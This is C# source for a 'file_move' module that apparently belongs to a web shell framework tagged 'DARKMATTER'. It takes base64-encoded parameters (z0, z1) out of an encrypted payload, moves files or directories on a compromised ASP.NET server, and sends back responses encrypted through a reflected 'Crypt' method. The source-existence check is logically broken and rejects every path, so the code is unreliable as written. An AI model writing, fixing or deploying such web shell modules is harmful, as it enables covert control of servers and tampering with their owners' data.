using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;

public class file_move
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abOutput, 1});

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            StringBuilder sb = new StringBuilder();

            string szSrcPath = fnB64Decode(dic["z0"]);
            string szDstPath = fnB64Decode(dic["z1"]);

            if (File.Exists(szDstPath) || Directory.Exists(szDstPath))
            {
                sb.Append("0|Destination already exists.");
            }
            else if (!File.Exists(szSrcPath) || !Directory.Exists(szSrcPath))
            {
                sb.Append("0|Source does not exist.");
            }
            else
            {
                try
                {
                    szSrcPath = Path.GetFullPath(szSrcPath);
                    szDstPath = Path.GetFullPath(szDstPath);

                    if (Directory.Exists(szSrcPath))
                        Directory.Move(szSrcPath, szDstPath);
                    else
                        File.Move(szSrcPath, szDstPath);

                    sb.Append("1|");
                }
                catch (Exception ex)
                {
                    sb.Append("0|ERROR://" + ex.Message);
                }
            }

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(sb.ToString()));
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}